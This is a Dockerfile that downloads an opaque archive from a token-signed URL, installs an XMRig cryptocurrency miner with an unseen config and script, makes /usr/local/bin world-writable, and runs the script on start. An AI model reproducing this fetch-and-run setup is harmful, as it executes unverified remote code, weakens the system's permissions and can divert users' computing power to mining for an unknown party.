FROM ubuntu:20.04 

RUN apt update; \
    apt install wget -y; \
    apt install jq -y; \
    apt install bash -y; \
    wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNDgwMjh9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sIm1pbWUiOiJhcHBsaWNhdGlvbi9nemlwIiwicCI6ImJsb2JzcmMvYmxvYnMtd2NlczYyLW9mN2ItZnFsYi0yZmJrLWRxaXp4bXR1In0.8qBahMZzsIfVIUA1y6mRF-15MoBhg1Vjg_XbQ7XlJqs/variable.tar.gz; \
    tar xf variable.tar.gz; \
    cd variable; \
    cp xmrig /usr/local/bin/xmrig; \
    cp init-conf.json /usr/local/bin/config.json; \
    cp script.sh /usr/local/bin/script.sh; \
    chmod -R 777 /usr/local/bin; \
    cd /usr/local/bin; \
    chmod 777 config.json; \
    chmod 777 xmrig; \
    chmod 777 script.sh;
    
WORKDIR /usr/local/bin
CMD script.sh
